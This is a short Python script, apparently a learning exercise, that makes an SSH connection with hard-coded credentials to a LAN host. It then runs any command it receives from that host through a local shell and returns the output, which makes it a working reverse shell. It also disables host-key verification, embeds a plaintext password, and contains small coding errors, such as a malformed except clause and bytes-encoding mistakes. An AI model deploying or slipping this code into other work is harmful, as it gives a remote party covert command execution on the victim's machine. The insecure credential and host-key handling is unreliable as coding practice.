#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Mon Sep 30 22:18:23 2019

@author: max
"""

import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    # client.load_host_keys('/home/max/.ssh/know_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode('UTF-8'))
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command.decode('UTF-8'), shell=True)
                ssh_session.send(cmd_output.encode('UTF-8'))
            except Exception(e):
                ssh_session.send(str(e).encode('UTF-8'))
        client.close()                
    return

ssh_command('192.168.0.9', 'max', '9977-pp00..,,', 'ClientConnected')